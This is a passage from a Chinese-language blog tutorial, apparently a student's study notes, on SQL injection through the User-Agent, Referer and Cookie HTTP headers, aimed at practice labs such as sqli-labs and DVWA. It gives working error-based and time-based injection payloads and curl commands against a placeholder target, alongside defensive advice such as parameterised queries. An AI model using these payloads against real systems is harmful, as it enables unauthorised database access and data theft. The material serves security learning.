+<p><strong>User-Agent</strong> 是客户端浏览器/爬虫等自动在请求头部发送的标识。部分 Web 程序会将 User-Agent 入库、拼接到 SQL 语句中（如用于“统计访客来源/终端”或日志记录）。如果没有对其内容进行恰当转义，攻击者可通过篡改 User-Agent 字段，实现 SQL 注入。</p>
+
+<h4 id="2-常见场景" data-numberify>2. 常见场景<a class="anchor ms-1" href="#2-常见场景"></a></h4>
+<ul>
+<li>网站统计或后台日志，直接把 User-Agent 内容写入数据库，没有参数校验。</li>
+<li>某些登录注册功能会把用户 User-Agent 入库、与 Session 绑定。</li>
+<li>某些爬虫检测规则会分析 User-Agent 并在入库前没有净化。</li>
+</ul>
+
+<h4 id="3-漏洞演示与利用" data-numberify>3. 漏洞演示与利用<a class="anchor ms-1" href="#3-漏洞演示与利用"></a></h4>
+<p><strong>构造注入 payload:</strong>
+用 Burp Suite / curl 改 User-Agent 字段为</p>
+<p>Code</p>
+<pre tabindex="0"><code>Mozilla/5.0&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
+</code></pre><p>或</p>
+<p>Code</p>
+<pre tabindex="0"><code>Mozilla/5.0&#39;;SELECT/**/updatexml(1,concat(0x7e,(user()),0x7e),1)--+
+</code></pre><p><strong>curl 示例：</strong></p>
+<p>bash</p>
+<pre tabindex="0"><code>curl https://target.site/path -H &#34;User-Agent: Mozilla/5.0&#39; AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+&#34;
+</code></pre><ul>
+<li>管理后台常见 User-Agent 日志页面，有时直接页面就回显SQL出错信息。</li>
+</ul>
+<p><strong>靶场使用：</strong></p>
+<ul>
+<li>DVWA（低安全模式下）、sqli-labs 少量场景有 user-agent 注入演示。</li>
+</ul>
+
+<h4 id="4-检测绕过技巧" data-numberify>4. 检测/绕过技巧<a class="anchor ms-1" href="#4-检测绕过技巧"></a></h4>
+<ul>
+<li>必须用中间人代理（Burp）或手工脚本，直接请求头注入。</li>
+<li>大部分CMS不会显示注入结果，但可观察响应时间（时间盲注）。</li>
+<li>结合 SQL 报错注入、布尔盲注技巧。</li>
+</ul>
+
+<h4 id="5-防御建议" data-numberify>5. 防御建议<a class="anchor ms-1" href="#5-防御建议"></a></h4>
+<ul>
+<li>服务器端处理所有 header 字段务必用预编译语句，不要拼接字符串。</li>
+<li>过滤/限制 header 长度，防止异常内容。</li>
+<li>后台页面/l日志推荐只读，不要直接回显 header 内容，无需入库的勿存储用户 header。</li>
+</ul>
+
+<h3 id="referer-注入" data-numberify>Referer 注入<a class="anchor ms-1" href="#referer-注入"></a></h3>
+
+<h4 id="1-原理说明-1" data-numberify>1. 原理说明<a class="anchor ms-1" href="#1-原理说明-1"></a></h4>
+<p><strong>Referer</strong> 是浏览器请求头，自带“我来自哪个网页”的信息。部分站点会把 Referer 字段写入数据库或作为业务逻辑的判别条件，没有经过处理/转义时就易产生 SQL 注入。</p>
+
+<h4 id="2-常见场景-1" data-numberify>2. 常见场景<a class="anchor ms-1" href="#2-常见场景-1"></a></h4>
+<ul>
+<li>网站统计系统，存储Referer来源地址，用于广告投放或PV统计。</li>
+<li>文章/图片下载计数、来路追踪等功能。</li>
+<li>某些平台有“访客来源”查询回显接口。</li>
+</ul>
+
+<h4 id="3-漏洞演示与利用-1" data-numberify>3. 漏洞演示与利用<a class="anchor ms-1" href="#3-漏洞演示与利用-1"></a></h4>
+<p><strong>curl 示例：</strong></p>
+<p>bash</p>
+<pre tabindex="0"><code>curl https://target.site/path -H &#34;Referer: https://evil.com/&#39; AND extractvalue(1,concat(0x7e,(select user()),0x7e))--+&#34;
+</code></pre><ul>
+<li>查看后台统计/日志/接口页面，如果页面有SQL报错即可注入回显。</li>
+</ul>
+<p><strong>payload建议：</strong></p>
+<p>Code</p>
+<pre tabindex="0"><code>https://www.baidu.com/&#39; UNION SELECT database() --+
+</code></pre><p><strong>靶场使用：</strong></p>
+<ul>
+<li>DVWA低安全/Medium下 Referer 注入。</li>
+<li>sqli-labs（少数场景）。</li>
+</ul>
+
+<h4 id="4-检测技巧绕过" data-numberify>4. 检测技巧/绕过<a class="anchor ms-1" href="#4-检测技巧绕过"></a></h4>
+<ul>
+<li>Referer 很容易短时间更换，建议用代理工具测试。</li>
+<li>建议用报错注入、时间盲注、延迟注入等方式辅助发现。</li>
+</ul>
+
+<h4 id="5-防御建议-1" data-numberify>5. 防御建议<a class="anchor ms-1" href="#5-防御建议-1"></a></h4>
+<ul>
+<li>对所有入库或用来拼接 SQL 的 Referer 变量严格参数化。</li>
+<li>Referer 可伪造，安全性不能用于业务判别，仅做统计用。</li>
+<li>只读显示时注意 HTML 编码，防止XSS，并杜绝回显 SQL 错误。</li>
+</ul>
+<hr>
+
+<h3 id="cookie-注入" data-numberify>Cookie 注入<a class="anchor ms-1" href="#cookie-注入"></a></h3>
+
+<h4 id="1-原理说明-2" data-numberify>1. 原理说明<a class="anchor ms-1" href="#1-原理说明-2"></a></h4>
+<p><strong>Cookie</strong> 是浏览器自动带的客户端状态数据，本应只用于身份维持。但某些后台会直接读取 cookie 值，并入库或用作数据库查询，如登录校验、统计功能等。如果未经过滤拼接进 SQL，也会导致注入攻击。</p>
+
+<h4 id="2-常见场景-2" data-numberify>2. 常见场景<a class="anchor ms-1" href="#2-常见场景-2"></a></h4>
+<ul>
+<li>后台为了记录用户 Session/Token/偏好，存储Cookie到数据库。</li>
+<li>某些登录/注册/投票功能从 Cookie 读取参数直接拼进SQL语句。</li>
+<li>登录状态判断时读取 cookie 数据库字段直接判别逻辑。</li>
+</ul>
+
+<h4 id="3-漏洞演示与利用-2" data-numberify>3. 漏洞演示与利用<a class="anchor ms-1" href="#3-漏洞演示与利用-2"></a></h4>
+<p><strong>curl 示例：</strong></p>
+<p>bash</p>
+<pre tabindex="0"><code>curl https://target.site/path -H &#34;Cookie: PHPSESSID=abcde; user=1&#39; AND updatexml(1,concat(0x7e,(select user()),0x7e),1)--+&#34;
+</code></pre><ul>
+<li>某些站点 Cookie key 是 user=或 id=，直接尝试拼接SQL注入 payload。</li>
+</ul>
+<p><strong>payload 示例：</strong></p>
+<p>Code</p>
+<pre tabindex="0"><code>Cookie: id=1&#39; and (select sleep(3))--+
+</code></pre><p><strong>靶场：</strong></p>
+<ul>
+<li>sqli-labs的部分实验可以通过 Cookie 注入达到爆破效果。</li>
+</ul>
+
+<h4 id="4-检测技巧绕过-1" data-numberify>4. 检测技巧/绕过<a class="anchor ms-1" href="#4-检测技巧绕过-1"></a></h4>
+<ul>
+<li>Cookie 字段有时长度限制，建议多尝试不同字段和参数名（如 id=, token=, auth=）。</li>
+<li>可使用通用注入 payload，配合盲注、报错等综合方法探测。</li>
+</ul>
+
+<h4 id="5-防御建议-2" data-numberify>5. 防御建议<a class="anchor ms-1" href="#5-防御建议-2"></a></h4>
+<ul>
+<li>禁止直接把 Cookie 值拼接进 SQL 语句（永远使用参数化/预编译）。</li>
+<li>Cookie 用于身份校验等敏感场景强烈建议用白名单、签名机制。</li>
+<li>避免敏感信息明文保存在 Cookie，加强加密校验。</li>
+</ul>
+</div>
+</div>
+</div><div class="card-footer">
+  <div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-prev">
+      <i class="fas fa-fw fa-chevron-down post-prev-icon me-1" data-fa-transform="rotate-90"></i>
+      <a href="/posts/sqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">SQLi-labs靶场搭建</a>
+    </div><div class="post-nav post-next">
+      <a href="/posts/ctf-web-guide/">[持续更新] CTF-Web Guide</a>
+      <i class="fas fa-fw fa-chevron-down post-next-icon ms-1" data-fa-transform="rotate-270"></i>
+    </div></div>
+</div></article>
+<section class="related-posts row card component">
+      <div class="card-header">
+        <h2 class="card-title fs-4 my-2 text-surface">
+          Related Posts
+        </h2>
+      </div>
+      <div class="card-body slide px-1">
+        <div class="slide-inner row gx-0"><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <picture><img class="img-fluid" alt="[持续更新] CTF-Web Guide" src="https://xiaochai-123.github.io/images/1.png" loading="lazy"
+     width="2400"
+     height="1350"/>
+  </picture>
+
+  <a class="post-title" href="/posts/ctf-web-guide/">
+    [持续更新] CTF-Web Guide
+  </a>
+  <div class="post-meta mb-0">
+    December 17, 2025
+
+  </div>
+</div>
+
+          </div><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <picture><img class="img-fluid" alt="双重md5爆破" src="https://xiaochai-123.github.io/images/MD5.png" loading="lazy"
+     width="626"
+     height="251"/>
+  </picture>
+
+  <a class="post-title" href="/posts/%E5%8F%8C%E9%87%8Dmd5%E7%88%86%E7%A0%B4/">
+    双重md5爆破
+  </a>
+  <div class="post-meta mb-0">
+    December 5, 2025
+
+  </div>
+</div>
+
+          </div><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <div
+    class="post-card-default-img card-img-top d-flex align-items-center justify-content-center bg-body-secondary mb-1">
+    NO IMAGE
+  </div>
+
+  <a class="post-title" href="/posts/251204/">
+    251204每日打卡
+  </a>
+  <div class="post-meta mb-0">
+    December 4, 2025
+
+  </div>
+</div>
+
+          </div><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <div
+    class="post-card-default-img card-img-top d-flex align-items-center justify-content-center bg-body-secondary mb-1">
+    NO IMAGE
+  </div>
+
+  <a class="post-title" href="/posts/251129/">
+    251129每日打卡
+  </a>
+  <div class="post-meta mb-0">
+    November 29, 2025
+
+  </div>
+</div>
+
+          </div><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <div
+    class="post-card-default-img card-img-top d-flex align-items-center justify-content-center bg-body-secondary mb-1">
+    NO IMAGE
+  </div>
+
+  <a class="post-title" href="/posts/bkcrack%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">
+    bkcrack的使用方法
+  </a>
+  <div class="post-meta mb-0">
+    December 17, 2025
+
+  </div>
+</div>
+
+          </div></div>
+        <button class="slide-control-left">
+          <i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i>
+          <span class="visually-hidden">Left</span>
+        </button>
+        <button class="slide-control-right">
+          <i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-270"></i>
+          <span class="visually-hidden">Right</span>
+        </button>
+      </div>
+    </section><div class="card component row post-comments" id="post-comments">
+  <div class="card-header">
+    <h2 class="card-title my-2 fs-4 text-surface">Comments</h2>
+  </div>
+  <div class="card-body">
+
+<div class="giscus"></div>
+
+
+
+</div>
+</div></div>
+</div>
+<aside class="col-xxl-4 sidebar d-flex">
+  <div class="container d-flex flex-column">
+    
+    
+<div class="card mb-3">
+  <div class="card-body text-center">
+    <img src="/images/my-avatar.jpg" alt="我的头像" class="rounded-circle mb-2" width="100" height="100">
+    <h5 class="card-title">xiaochai_123</h5>
+    <p class="card-text">CS学生 | CTF界的小学生 | BD7PUC</p>
+<nav class="d-flex justify-content-center gap-2 my-2">
+  <a class="btn btn-sm btn-outline-dark rounded-circle" href="https://github.com/xiaochai-123" title="GitHub" target="_blank">
+    <i class="fab fa-github"></i>
+  </a>
+  <a class="btn btn-sm btn-outline-primary rounded-circle" href="mailto:l2556843965@163.com" title="Email">
+    <i class="fas fa-envelope"></i>
+  </a>
+  <a class="btn btn-sm btn-outline-danger rounded-circle" href="https://space.bilibili.com/595746072" title="Bilibili" target="_blank">
+  <i class="fab fa-bilibili"></i> 
+</a>
+  
+</nav>
+  </div>
+</div>
+
+
+    <div class="accordion posts-toggle">
+      <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+          <a
+            class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+            role="button"
+            data-bs-toggle="collapse"
+            href="#posts-toggle"
+            aria-expanded="true"
+            aria-controls="posts-toggle">
+            Posts
+          </a>
+        </div>
+        <div
+          class="card-body collapse accordion-collapse accordion-body d-lg-block show"
+          id="posts-toggle">
+          <ul class="nav nav-pills nav-fill" role="tablist">
+              <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link active"
+                  id="recent-posts-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#recent-posts"
+                  type="button"
+                  role="tab"
+                  aria-controls="recent-posts"
+                  aria-selected="true">
+                  Recent Posts
+                </button>
+              </li>
+          </ul>
+
+          <div class="tab-content mt-3">
+              <div
+                class="tab-pane active"
+                id="recent-posts"
+                role="tabpanel"
+                aria-labelledby="recent-posts-tab"
+                tabindex="0">
+                <ul class="post-list list-unstyled ms-1">
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="SQLi-labs靶场搭建" src="https://xiaochai-123.github.io/images/SQL.png" loading="lazy"
+     width="1546"
+     height="699"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/sqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">
+        SQLi-labs靶场搭建
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          December 22, 2025
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="SQL注入——sqli-labs学习笔记" src="https://xiaochai-123.github.io/images/SQL1.png" loading="lazy"
+     width="474"
+     height="240"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/sqli-labs/">
+        SQL注入——sqli-labs学习笔记
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          December 22, 2025
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+  <div class="d-flex">
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
+      <a class="post-title" href="/posts/bkcrack%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">
+        bkcrack的使用方法
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          December 17, 2025
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="[持续更新] CTF-Web Guide" src="https://xiaochai-123.github.io/images/1.png" loading="lazy"
+     width="2400"
+     height="1350"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/ctf-web-guide/">
+        [持续更新] CTF-Web Guide
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          December 17, 2025
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="双重md5爆破" src="https://xiaochai-123.github.io/images/MD5.png" loading="lazy"
+     width="626"
+     height="251"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/%E5%8F%8C%E9%87%8Dmd5%E7%88%86%E7%A0%B4/">
+        双重md5爆破
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          December 5, 2025
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                </ul>
+              </div>
+          </div>
+        </div>
+      </div>
+    </div>
+<div class="accordion post-toc d-none d-lg-block">
+  <div class="accordion-item row mb-4 card component" id="postTOC">
+    <div class="card-header accordion-header">
+      <h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">Contents</h2>
+      <a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role="button" data-bs-toggle="collapse" href="#post-toc" aria-expanded="false" aria-controls="post-toc">
+        Contents
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block" id="post-toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#union注入">Union注入</a></li>
+    <li><a href="#报错注入">报错注入</a>
+      <ul>
+        <li><a href="#extractvalue报错注入">extractValue()报错注入</a></li>
+        <li><a href="#updatexml报错注入">Updatexml报错注入</a></li>
+        <li><a href="#floor报错注入">floor报错注入</a></li>
+      </ul>
+    </li>
+    <li><a href="#盲注">盲注</a>
+      <ul>
+        <li><a href="#布尔盲注">布尔盲注</a></li>
+        <li><a href="#时间盲注">时间盲注</a></li>
+        <li><a href="#dnslog注入">DNSlog注入</a></li>
+      </ul>
+    </li>
+    <li><a href="#sql注入文件上传">sql注入文件上传</a></li>
+    <li><a href="#post注入">POST注入</a></li>
+    <li><a href="#http头注入报头注入">HTTP头注入(报头注入)</a>
+      <ul>
+        <li><a href="#user-agent-注入uagent-注入">User-Agent 注入（UAgent 注入）</a></li>
+        <li><a href="#referer-注入">Referer 注入</a></li>
+        <li><a href="#cookie-注入">Cookie 注入</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+  </div>
+</aside>
+
+      </div>
+    </main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex="-1" id="offcanvasActionsPanel"
+  aria-labelledby="offcanvasActionsPanelLabel">
+  <div class="offcanvas-header">
+    <div class="offcanvas-title h5" id="offcanvasActionsPanelLabel">
+      <i class="fas fa-fw fa-th-large me-1"></i>
+      Actions
+    </div>
+    <button type="button" class="btn-close ms-auto" data-bs-dismiss="offcanvas" data-bs-target="offcanvasActionsPanel" aria-label="Close"></button>
+  </div>
+  <div class="offcanvas-body mt-2"><div class="social-share mb-4 d-flex overflow-auto">
+      <a class="btn-social-share d-flex flex-column align-items-center me-3" rel="noopener noreferrer" aria-label="X Share Button"
+      target="_blank" href="https://x.com/intent/tweet?title=SQL%e6%b3%a8%e5%85%a5%e2%80%94%e2%80%94sqli-labs%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0&url=https%3a%2f%2fxiaochai-123.github.io%2fposts%2fsqli-labs%2f">
+        <i class="fab fa-2x fa-fw fa-x-twitter mb-2"></i> X
+      </a>
+      <a class="btn-social-share d-flex flex-column align-items-center me-3" rel="noopener noreferrer" aria-label="Facebook Share Button"
+        target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fxiaochai-123.github.io%2fposts%2fsqli-labs%2f">
+        <i class="fab fa-2x fa-fw fa-facebook-f mb-2"></i> Facebook
+      </a>
+    </div>
+    <hr class="mb-4"><div class="actions d-flex overflow-auto align-items-center">
+      <a role="button" class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i></span> Go back
+      </a>
+      <a role="button" class="action action-reload-page d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> Reload
+      </a>
+      <a role="button" class="action action-copy-url d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> Copy URL
+      </a>
+  </div>
+    </div>
+  </div>
+</div><div class="row text-center">
+  <div class="col-12 mt-2">
+    <p class="mb-2">xiaochai_123的小窝</p>
+    <p class="text-secondary mb-2"><small>Welcome to xiaochai_123’s Blog! I look forward to sharing this great journey with you.</small></p>© 2025 xiaochai-123. 欢迎转载但请注明出处 | 本博客内容版权所有
+    <div class="footer-line visitor" style="margin: 0.5em 0;">
+      <span id="busuanzi_container_site_uv" title="总访客数" style="display: inline;">
+        👤 总访客数 <span id="busuanzi_value_site_uv">...</span>
+      </span>
+      <span id="busuanzi_container_site_pv" class="footer-divider" title="总访问量" style="display: inline; margin-left: 1em;">
+        👁️ 总访问量 <span id="busuanzi_value_site_pv">...</span>
+      </span>
+    </div>
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <div class="powered-by mb-2 text-secondary">
+  <small>
+    Build with ❤️ from the <a class="text-primary" href="https://gohugo.io" target="_blank" rel="noopener noreferrer">Hugo</a> and the <a class="text-primary" href="https://github.com/razonyang/hugo-theme-bootstrap" target="_blank" rel="noopener noreferrer">HBS</a> theme.
+  </small>
+</div>
+
+
+<nav class="social-links nav justify-content-center mb-2 mt-3">
+    <a class="nav-link social-link p-0 me-1 mb-2" href="mailto:mailto:l2556843965@163.com" title="Email">
+      <i class="fas fa-fw fa-2x fa-envelope" style="color: #0963ac;"></i>
+    </a>
+      <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" href="https://github.com/xiaochai-123" title="GitHub" rel="me">
+        <i class="fa-fw fa-2x fab fa-github"
+          ></i>
+      </a>
+  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="https://xiaochai-123.github.io/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
+</div>
+<script src="/js/copy-code.js"></script>
+<link rel="stylesheet" href="/css/copy-code.css">
+</footer>
+<script data-precache src="/assets/main/bundle.min.5f7fecfd2a8f9951e8efea436dc08e86e678d38ab9eeb343e3d1324d57f3f64a.js" integrity="sha256-X3/s/SqPmVHo7&#43;pDbcCOhuZ404q57rND49EyTVfz9ko=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.0b03280daa4a59445b0aafc46855a2bb53b310e572534596869c33acaeec09dd.js" integrity="sha256-CwMoDapKWURbCq/EaFWiu1OzEOVyU0WWhpwzrK7sCd0=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/viewer/bundle.min.cca398d318de9fa7816141db90f09282784fcfe0c5dabc31599b8c589932e4ae.js" integrity="sha256-zKOY0xjen6eBYUHbkPCSgnhPz&#43;DF2rwxWZuMWJky5K4=" crossorigin="anonymous" defer></script>
+<script src="https://giscus.app/client.js"
+    data-repo="xiaochai-123/xiaochai-123.github.io"
+    data-repo-id="R_kgDOQcBRNA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOQcBRNM4Cy98G"
+    data-mapping="pathname"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    data-loading="lazy"
+    crossorigin="anonymous"
+    defer>
+</script>
+
+
+  </body>
+</html>
